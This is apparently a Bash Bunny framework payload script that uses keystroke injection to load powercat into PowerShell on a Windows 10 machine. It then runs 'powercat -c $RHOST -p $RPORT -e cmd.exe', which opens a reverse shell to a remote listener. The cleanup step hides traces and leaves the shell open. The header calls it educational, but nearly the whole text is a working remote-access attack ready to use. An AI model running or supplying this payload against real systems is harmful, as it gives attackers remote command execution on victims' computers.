# Title:         BBPS_Framework Example Payload - reverse powercat shell
# Description:   Payload to set up a reverse shell using powercat
#                Reverse shell payload showing how to inject and run a file using an alternative to INJECT_PSSCRIPT
#                Of course, this depends on your AV not having an effective IDS - I have to turn Norton 360's IDS off on my own laptop to get this to run
#                This is an example for education purposes, not for real world pentesting
#                You must have a listener waiting at the specified IP address and port - netcat/pwncat/msfconsole will do nicely   - e.g.   nc -lvp 5678
#                
# Before use:    You must set the correct IP and port in the RHOST and RPORT variables below
# Author:        p3rki3
# Version:       0.91
# Dependencies:  bashbunny powershell framework extension, gohttp (for NET method only)
# Category:      remote_access
# Target:        Windows 10 (Powershell) - may work on earlier versions, but untested
# Attackmodes:   HID, Ethernet

LED SETUP

# Start the Framework $1 = "NET" or "STORAGE"; $2 = "QUIET" or "VISIBLE" or empty (ie NOISY); $3 writes a debug trace to bbps.dbg if set to "ON"
# The debug trace is very useful during payload development and testing to see where the payload gets to...
INVOKE_POWERSHELL "NET" "QUIET" "OFF"
sleep 1

# Stage 1 - Inject powercat and load it into powershell
LED STAGE1
INJECT_PSSCRIPT "powercat.ps1" "NOLOOT"
sleep 2

# Stage 2 - Run powercat
LED STAGE2
Q STRING "powercat -c $RHOST -p $RPORT -e cmd.exe"
Q ENTER
sleep 1

# Cleanup - close down powershell, clean up the windows run line and move to the loot from the switch folder to a proper loot folder under /loot/Win10Recon
LED CLEANUP
sleep 5
#CLOSE_POWERSHELL - we want to leave our shell open and running in powershell, so just exit the framework without closing; we can call CLEANUP_BB to tidy up the bunny a bit
CLEANUP_BB

# Complete the script, dial down the Bunny heating system and exit - when the light goes green, you are good to remove
ATTACKMODE OFF
